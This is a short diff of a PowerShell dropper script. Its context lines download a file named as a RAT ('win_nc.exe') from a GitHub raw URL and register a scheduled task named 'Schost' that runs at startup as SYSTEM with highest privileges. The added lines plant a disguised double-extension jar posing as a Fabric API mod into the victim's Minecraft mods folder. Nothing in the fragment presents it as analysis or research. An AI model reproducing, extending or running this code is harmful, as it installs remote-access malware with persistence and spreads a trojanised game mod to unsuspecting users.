@@ -19,6 +19,11 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/s
 $ratPath = "$workDir\win_nc.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/win_nc.exe" -OutFile $ratPath
 
+$minecraftMods = "$env:APPDATA\.minecraft\mods"
+if (Test-Path $minecraftMods) {
+    $jarPath = "$minecraftMods\fabric-api-0.179.1_22.1.2.jar.jar"
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/MurphCodeDev/wf/main/fabric-api-0.179.1_22.1.2.jar.jar" -OutFile $jarPath
+}
 
 Write-Host "[4/7]" -ForegroundColor Cyan
 schtasks /create /tn "Schost" /tr "cmd /c start /b $schostPath" /sc onstart /ru SYSTEM /rl HIGHEST /f > $null 2>&1
